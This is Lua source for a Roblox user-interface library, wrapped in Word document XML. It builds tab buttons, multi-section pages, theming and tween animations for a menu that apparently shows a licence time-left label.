    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local time_left = tostring((LRM_SecondsLeft &lt; math.huge and ""..tostring(math.floor(((LRM_SecondsLeft / 60) / 60) / 24)).." days" or LRM_SecondsLeft == math.huge and "lifetime"))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "other_info" ] = library:create( "TextLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = items[ "info" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    RichText = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextColor3 = themes.preset.accent;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Text = '&lt;font color="rgb(72, 72, 73)"&gt;'..time_left..', &lt;/font&gt;' .. cfg.name:lower() .. cfg.suffix:lower();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, 0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(0, -10, 0.5, -1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AnchorPoint = vec2(0, 0.5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    TextXAlignment = Enum.TextXAlignment.Right;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    AutomaticSize = Enum.AutomaticSize.XY;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    FontFace = fonts.font;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"other_info" ], "accent", "TextColor3");        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            do -- Other</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:draggify(items[ "main" ])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library:resizify(items[ "main" ])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            function cfg.toggle_menu(bool) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- WIP </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- if cfg.tween then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                --     cfg.tween:Cancel()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- items[ "main" ].Size = dim2(items[ "main" ].Size.Scale.X, items[ "main" ].Size.Offset.X - 20, items[ "main" ].Size.Scale.Y, items[ "main" ].Size.Offset.Y - 20)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- library:tween(items[ "tab_holder" ], {Size = dim2(1, -196, 1, -81)}, Enum.EasingStyle.Quad, 0.4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- cfg.tween = </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                --cursor_image.Visible = bool</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                --uis.MouseIconEnabled = not bool</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                library[ "items" ].Enabled = bool</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            RunService.RenderStepped:Connect(LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if library[ "items" ].Enabled and not uis.MouseIconEnabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    uis.MouseIconEnabled = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p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library:tab(properties)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local cfg = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = properties.name or properties.Name or "visuals"; </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                icon = properties.icon or properties.Icon or "http://www.roblox.com/asset/?id=6034767608";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- multi </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                tabs = properties.tabs or properties.Tabs or {"Main", "Misc.", "Settings"};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                pages = {}; -- data store for multi sections</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                current_multi; </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            } </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local items = cfg.items; do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                items[ "tab_holder" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = library.cache;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Visible = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Position = dim2(0, 196, 0, 56);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Size = dim2(1, -216, 1, -101);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-- Tab buttons </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "button" ] = library:create( "TextButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        FontFace = fonts.font;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TextColor3 = rgb(255, 255, 255);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self.items[ "button_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        AutoButtonColor = false;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Size = dim2(1, 0, 0, 35);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        TextSize = 16;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundColor3 = rgb(29, 29, 29)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"icon" ] = library:create( "ImageLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ImageColor3 = rgb(72, 72, 73);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        AnchorPoint = vec2(0, 0.5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Image = cfg.icon;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(0, 10, 0.5, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0, 22, 0, 22);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 library:apply_theme(items[ "icon" ], "accent", "ImageColor3");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "name" ]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rgb(72, 72, 73);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Text = cfg.name;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Size = dim2(0, 0, 1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Position = dim2(0, 40,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"name" ];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"button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        CornerRadius = dim(0, 7)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rgb(23, 23, 29);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Enabled = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ApplyStrokeMode = Enum.ApplyStrokeMode.Border</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                -- Multi Sections</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    items[ "multi_section_button_holder" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = library.cache;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Visible = false;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"multi_section_button_holder"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Enum.SortOrder.LayoutOrder;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        FillDirection = Enum.FillDirection.Horizontal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PaddingTop = dim(0, 8);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PaddingBottom = dim(0, 7);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Parent = items[ "multi_section_button_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PaddingRight = dim(0, 7);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        PaddingLeft = dim(0, 7)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    });                        </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for _, section in cfg.tabs do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local data = {items = {}} </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local multi_items = data.items; do </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            -- Button</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                multi_items[ "button" ] = library:create( "TextButton" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    FontFace = fonts.font;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    TextColor3 = rgb(255, 255, 255);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    AutoButtonColor = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Text = "";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Parent = items[ "multi_section_button_holder" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Size = dim2(0, 0, 0, 39);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    ClipsDescendants = true;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    AutomaticSize = Enum.AutomaticSize.X;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    TextSize = 16;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BackgroundColor3 = rgb(25, 25, 29)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multi_items[ "name" ] = library:create( "TextLabel" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    FontFace = fonts.font;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    TextColor3 = rgb(62, 62, 63);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Text = section;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Parent = multi_items[ "button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Size = dim2(0, 0, 1, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    TextXAlignment = Enum.TextXAlignment.Left;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    AutomaticSize = Enum.AutomaticSize.XY;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    TextSize = 16;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BackgroundColor3 = rgb(255, 255, 255)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"UIPadding" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Parent = multi_items[ "name" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    PaddingRight = dim(0, 5);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    PaddingLeft = dim(0, 5)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multi_items[ "accent" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    AnchorPoint = vec2(0, 1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Parent = multi_items[ "button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Position = dim2(0, 10, 1, 4);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Size = dim2(1, -20, 0, 6);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BackgroundColor3 = themes.preset.accent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                }); library:apply_theme(multi_items[ "accent" ], "accent", "BackgroundColor3");</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                library:create( "UICorner" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Parent = multi_items[ "accent" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    CornerRadius = dim(0, 999)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"UIPadding" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Parent = multi_items[ "button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    PaddingRight = dim(0, 10);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    PaddingLeft = dim(0, 10)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"UICorner" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Parent = multi_items[ "button" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    CornerRadius = dim(0, 7)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                }); </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            --</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            -- Tab </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                multi_items[ "tab" ] = library:create( "Frame" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Parent = library.cache;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BackgroundTransparency = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Name = "\0";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BorderColor3 = rgb(0, 0, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Size = dim2(1, -20, 1, -20);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BorderSizePixel = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Visible = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    BackgroundColor3 = rgb(255, 255, 255)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"UIListLayout" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    FillDirection = Enum.FillDirection.Vertical;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    HorizontalFlex = Enum.UIFlexAlignment.Fill;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Parent = multi_items[ "tab" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Padding = dim(0, 7);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    SortOrder = Enum.SortOrder.LayoutOrder;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    VerticalFlex = Enum.UIFlexAlignment.Fill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"UIPadding" , {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    PaddingTop = dim(0, 7);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    PaddingBottom = dim(0, 7);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Parent = multi_items[ "tab" ];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    PaddingRight = dim(0, 7);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    PaddingLeft = dim(0, 7)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                });</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            --</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        data.text = multi_items[ "name" ]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        data.accent = multi_items[ "accent" ]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        data.button = multi_items[ "button" ]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        data.page = multi_items[ "tab" ]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        data.parent = setmetatable(data, library):sub_tab({}).items[ "tab_parent" ]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        -- Old column code</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        -- data.left = multi_items[ "left" ]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        -- data.right = multi_items[ "right" ]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>function data.open_page()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t xml:space="preserve">local page = cfg.current_multi; </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if page and page.text ~= data.text then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                self.items[ "global_fade" ].BackgroundTransparency = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                library:tween(self.items[ "global_fade" ], {BackgroundTransparency = 1}, Enum.EasingStyle.Quad, 0.4)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                local old_size = page.page.Size</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                page.page.Size = dim2(1, -20, 1, -20)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if page then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                library:tween(page.text, {TextColor3 = rgb(62, 62, 63)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                library:tween(page.accent, {BackgroundTransparency = 1})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                library:tween(page.button, {BackgroundTransparency = 1})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                page.page.Visible = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                page.page.Parent = library[ "cache" ] </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            library:tween(data.text, {TextColor3 = rgb(255, 255, 255)})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            library:tween(data.accent, {BackgroundTransparency = 0})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            library:tween(data.button, {BackgroundTransparency = 0})</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            library:tween(data.page, {Size = dim2(1, 0, 1, 0)}, Enum.EasingStyle.Quad, 0.4)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            data.page.Visible = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            data.page.Parent = items["tab_holder"]</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            cfg.current_multi = data</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            library:close_element()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>multi_items[ "button" ].MouseButton1Down:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t xml:space="preserve">data.open_page() </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:t>end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:tab/>
        <w:tab/>
        <w:tab/>
        <w:tab/>
